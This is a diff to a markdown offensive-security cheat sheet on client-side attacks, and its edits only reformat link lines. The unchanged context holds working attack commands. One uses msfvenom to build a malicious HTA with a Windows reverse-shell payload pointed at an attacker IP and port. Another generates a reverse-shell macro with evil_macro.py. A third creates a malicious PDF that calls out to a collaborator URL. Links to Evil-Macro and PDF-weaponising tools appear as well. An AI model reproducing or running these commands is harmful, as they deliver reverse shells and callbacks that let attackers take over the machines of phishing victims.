@@ -2,7 +2,7 @@
 ## HTA Attack in Action
 
 -> Get web browser name, operating system, device type  
-https://explore.whatismybrowser.com/useragents/parse/#parse-useragent
+- https://explore.whatismybrowser.com/useragents/parse/#parse-useragent
 
 -> Creating a malicious .hta with msfvenom
 ```bash
@@ -14,14 +14,14 @@ sudo msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o
 ```bash
 python evil_macro.py -l <ip> -p <port> -o macro.txt
 ```
-https://github.com/rodolfomarianocy/Evil-Macro/
+- https://github.com/rodolfomarianocy/Evil-Macro/
 
 ## Malicious PDF
 -> Malicious PDF Generator
 ```bash
 python3 malicious-pdf.py burp-collaborator-url
 ```
-https://github.com/jonaslejon/malicious-pdf
+- https://github.com/jonaslejon/malicious-pdf
 
 -> evilpdf  
-https://github.com/superzerosec/evilpdf
+- https://github.com/superzerosec/evilpdf
